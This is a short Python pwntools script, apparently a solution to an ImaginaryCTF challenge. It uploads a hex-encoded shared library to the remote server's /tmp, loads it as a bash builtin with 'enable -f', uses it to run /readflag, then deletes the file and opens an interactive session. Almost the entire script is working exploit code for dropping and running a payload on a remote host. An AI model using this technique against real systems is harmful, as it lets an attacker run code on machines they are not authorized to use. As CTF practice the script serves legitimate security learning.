from pwn import *

# context.log_level = "debug"

with open("./run.so", "rb") as f:
    encoded = "".join([f"\\x{x:02x}" for x in f.read()])

io = remote("puzzler7.imaginaryctf.org", 29466)
io.sendline(f"printf '{encoded}' > /tmp/run.so".encode())
io.sendline(b"enable -f /tmp/run.so run")
io.sendline(b"run /readflag")
io.sendline(b"run /bin/rm /tmp/run.so")
io.interactive()
